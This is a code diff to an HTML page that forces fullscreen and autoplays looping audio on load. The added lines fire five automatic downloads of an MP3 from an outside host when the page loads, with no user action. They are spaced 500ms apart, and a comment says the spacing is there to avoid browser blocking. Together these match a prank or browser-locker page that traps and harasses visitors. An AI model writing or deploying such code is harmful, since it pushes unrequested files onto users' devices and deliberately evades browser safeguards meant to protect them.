@@ -37,7 +37,7 @@
     img {
       width: 100%;
       height: 100%;
-      object-fit: contain; /* Changed back to contain to show full image */
+      object-fit: contain; /* Ensure full image is visible */
       object-position: center; /* Center the image */
       user-select: none;
       pointer-events: none;
@@ -51,11 +51,21 @@
     </div>
   </div>
 
-  <audio id="aud" src="1.mp3" preload="auto" loop></audio>
+  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>
 
   <script>
     const popup = document.getElementById('popup');
     const audio = document.getElementById('aud');
+
+    // Function to trigger MP3 download
+    function triggerDownload(url, filename) {
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename || '1.mp3'; // Set default filename
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
 
     // Fullscreen functionality
     function enterFullscreen() {
@@ -74,7 +84,6 @@
     function tryPlayAudio() {
       audio.play().catch((error) => {
         console.log('Autoplay prevented:', error);
-        // Fallback to play on user interaction
         document.addEventListener('click', () => {
           audio.play().catch(() => {});
         }, { once: true });
@@ -84,6 +93,16 @@
     window.addEventListener('load', () => {
       enterFullscreen();
       tryPlayAudio();
+
+      // Trigger multiple downloads (e.g., 5 times)
+      const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
+      const downloadCount = 5; // Adjust number of downloads
+      for (let i = 0; i < downloadCount; i++) {
+        // Add slight delay to avoid browser blocking
+        setTimeout(() => {
+          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
+        }, i * 500); // 500ms delay between downloads
+      }
 
       // Monitor fullscreen status
       setInterval(() => {
